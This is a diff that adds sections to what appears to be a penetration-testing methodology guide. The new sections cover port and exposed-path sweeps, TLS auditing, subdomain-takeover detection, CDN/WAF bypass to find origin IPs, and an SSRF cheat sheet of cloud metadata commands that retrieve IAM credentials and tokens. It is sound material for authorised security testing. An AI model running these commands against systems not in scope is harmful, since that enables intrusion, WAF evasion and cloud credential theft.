@@ -487,3 +487,194 @@ RATE = 0.35  # seconds between requests → ~3/sec
 ```
 
 If you find yourself writing `threads=` or `asyncio.gather` anywhere in a probe, stop. Research-grade probes are single-threaded by default; concurrency is for the maintainer's penetration team, not yours.
+
+
+## 10. Server / port sweep
+
+Run only against hosts explicitly in scope.
+
+```bash
+#!/usr/bin/env bash
+# server-sweep.sh — one-shot infra audit for a hostname in scope
+set -u
+HOST="${1:?usage: $0 hostname}"
+
+echo "=== A/AAAA ==="
+dig +short A "$HOST" AAAA "$HOST"
+
+echo "=== MX / TXT / NS ==="
+dig +short MX "$HOST" TXT "$HOST" NS "$HOST"
+
+echo "=== SPF / DMARC ==="
+dig +short TXT "$HOST" | grep -iE 'v=spf1'
+dig +short TXT "_dmarc.$HOST"
+
+echo "=== CAA ==="
+dig +short CAA "$HOST"
+
+echo "=== nmap top-200 + version ==="
+# -Pn: don't ping first (many hosts drop ICMP)
+# -T3: polite timing
+nmap -sS -sV -Pn -T3 --top-ports 200 "$HOST" 2>/dev/null | tail -40
+
+echo "=== Management + admin ports ==="
+# 2375=Docker, 2377=Swarm, 5432=PG, 6379=Redis, 27017=Mongo, 9200=Elastic
+# 6443=K8s API, 10250=kubelet, 11211=Memcached
+# 8080/9090=Traefik/Prometheus/Jenkins/Grafana admin
+nmap -sV -sC -Pn -T3 \
+  -p 22,2375,2376,2377,5432,6379,8080,9090,9200,6443,10250,11211,27017,5601,8888 \
+  "$HOST" 2>/dev/null | grep -v 'closed\|filtered' | tail -40
+
+echo "=== TLS (openssl one-shot) ==="
+echo | timeout 5 openssl s_client -connect "$HOST:443" -servername "$HOST" 2>&1 \
+  | openssl x509 -noout -dates -issuer -subject 2>/dev/null
+
+echo "=== HTTP security headers ==="
+curl -sI -L "https://$HOST/" | grep -iE \
+  'content-security|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy|cross-origin'
+
+echo "=== Common exposed paths ==="
+for p in .git/config .git/HEAD .env .env.bak config.json backup.sql dump.sql \
+         swagger.json openapi.json swagger-ui admin wp-admin phpinfo.php \
+         metrics health healthz actuator actuator/env actuator/heapdump \
+         graphql api/reference api/docs .well-known/security.txt \
+         server-status robots.txt rails/info/routes telescope horizon \
+         _ignition/execute-solution; do
+  code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 "https://$HOST/$p")
+  # Only print non-404, non-000
+  case "$code" in
+    200|301|302|401|403) printf '  %-35s %s\n' "$p" "$code" ;;
+  esac
+done
+```
+
+Run as `./server-sweep.sh target.example`. Each section is self-contained; comment out any block that's out-of-scope.
+
+## 11. TLS configuration audit
+
+```bash
+# Best single-tool audit — runs testssl.sh in a container, no install needed
+docker run --rm -ti drwetter/testssl.sh --fast --color 0 https://target.example
+
+# Quick manual check if you don't have docker
+for proto in tls1 tls1_1 tls1_2 tls1_3; do
+  printf '%-10s ' "$proto"
+  echo | openssl s_client -connect target.example:443 -servername target.example -"$proto" 2>&1 \
+    | grep -E 'Protocol|Cipher' | head -2 | tr '\n' ' '
+  echo
+done
+
+# Cert expiry + issuer
+echo | openssl s_client -connect target.example:443 -servername target.example 2>/dev/null \
+  | openssl x509 -noout -dates -subject -issuer
+
+# Full cert chain
+echo | openssl s_client -connect target.example:443 -servername target.example -showcerts 2>/dev/null
+```
+
+Red flags:
+- `tls1` or `tls1_1` accepted (anything below TLS 1.2)
+- Cipher list includes `RC4`, `3DES`, `EXPORT`, `NULL`, or `anon`
+- Certificate valid more than 398 days (CA/B Forum max)
+- Certificate issued by an unexpected CA
+- Missing `HSTS` with `preload` directive
+- Wildcard cert covering a parent domain broader than needed
+
+## 12. DNS / subdomain takeover
+
+```bash
+# Certificate transparency — all subdomains a CA has ever issued for
+curl -s "https://crt.sh/?q=%25.example.com&output=json" \
+  | jq -r '.[].name_value' | tr '\n' ','  | tr ',' '\n' | sort -u > subdomains.txt
+wc -l subdomains.txt
+
+# For each subdomain, resolve and identify CNAME targets that don't respond
+while read sub; do
+  cname=$(dig +short CNAME "$sub" | head -1)
+  [ -z "$cname" ] && continue
+  # Check if CNAME resolves and the service responds
+  addr=$(dig +short A "$cname" | head -1)
+  if [ -z "$addr" ]; then
+    echo "DANGLING CNAME: $sub -> $cname (target does not resolve)"
+    continue
+  fi
+  code=$(curl -sk -o /dev/null -w '%{http_code}' --max-time 5 "https://$sub/")
+  if [ "$code" = "404" ] || [ "$code" = "000" ]; then
+    # Classic takeover signatures from providers
+    body=$(curl -sk --max-time 5 "https://$sub/" | head -c 500)
+    case "$body" in
+      *"There isn't a GitHub Pages site here"*) echo "TAKEOVER (GitHub Pages): $sub -> $cname" ;;
+      *"No such app"*)                          echo "TAKEOVER (Heroku): $sub -> $cname" ;;
+      *"The specified bucket does not exist"*) echo "TAKEOVER (S3): $sub -> $cname" ;;
+      *"Fastly error: unknown domain"*)         echo "TAKEOVER (Fastly): $sub -> $cname" ;;
+      *"NoSuchBucket"*)                         echo "TAKEOVER (S3 alt): $sub -> $cname" ;;
+    esac
+  fi
+done < subdomains.txt
+```
+
+Subdomain takeover = attacker registers the missing resource (a fresh GitHub Pages site, Heroku app, S3 bucket) named to match the dangling CNAME. Now they serve content from `subdomain.your-company.com` — phish, steal cookies scoped to the parent domain (if the cookie doesn't set a narrow path), bypass CSP `allowed-origins` that list the subdomain.
+
+## 13. Origin IP discovery (CDN / WAF bypass)
+
+If target is behind Cloudflare / Akamai / Cloudfront / Fastly, hunt for the origin IP — once found, every edge rate-limit and WAF rule becomes optional.
+
+```bash
+# Method 1: Certificate Transparency — origin sometimes serves its cert direct
+curl -s "https://crt.sh/?q=example.com&output=json" | jq -r '.[].name_value' | sort -u
+
+# Method 2: Historical DNS records (ViewDNS, SecurityTrails, Shodan InternetDB)
+curl -s "https://internetdb.shodan.io/$(dig +short example.com | head -1)"
+# And lookup non-CDN A records historically — before the CDN was introduced
+curl -s "https://viewdns.info/iphistory/?domain=example.com"   # scrape if needed
+
+# Method 3: Mail headers — send mail TO example.com and inspect Received: chain
+# (mail server is often not behind the CDN)
+
+# Method 4: SSRF callback — if the target has an SSRF bug, the Remote-Addr on
+# your canary is the origin IP
+
+# Method 5: Direct-origin confirm once suspected
+curl --resolve example.com:443:1.2.3.4 https://example.com/api/health -k -v
+# If the response matches the live backend, CDN is bypassed
+```
+
+Once origin IP is known:
+- All CDN-layer rate limits are moot — score as High
+- Origin firewall should accept TLS only from published CDN IP ranges (Cloudflare, Akamai, Fastly, Cloudfront publish theirs)
+- Recommend IP rotation as part of the fix
+
+## 14. Cloud metadata via SSRF
+
+Only reachable from INSIDE the target's network — but SSRF puts you there. Cheat sheet of the endpoints each cloud exposes:
+
+```bash
+# AWS IMDSv1 (legacy, often still on)
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# → list of roles; then:
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
+# → AccessKeyId, SecretAccessKey, Token
+
+# AWS IMDSv2 (required on newer instances)
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# GCP
+curl -s -H "Metadata-Flavor: Google" \
+  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Azure
+curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+# DigitalOcean
+curl -s http://169.254.169.254/metadata/v1/user-data
+curl -s http://169.254.169.254/metadata/v1/id
+# user-data is often where startup scripts (with credentials) are passed in
+```
+
+If SSRF echoes response bodies to the caller, pointing at these yields **live cloud credentials**. That's Critical — attacker can spin up infra on your account, read your S3 buckets, decrypt your secrets.
+
+Defence: IMDSv2 (forces PUT-then-GET), egress firewall from app containers to `169.254.0.0/16`, and an SSRF-safe HTTP client in every outbound-fetch call site.
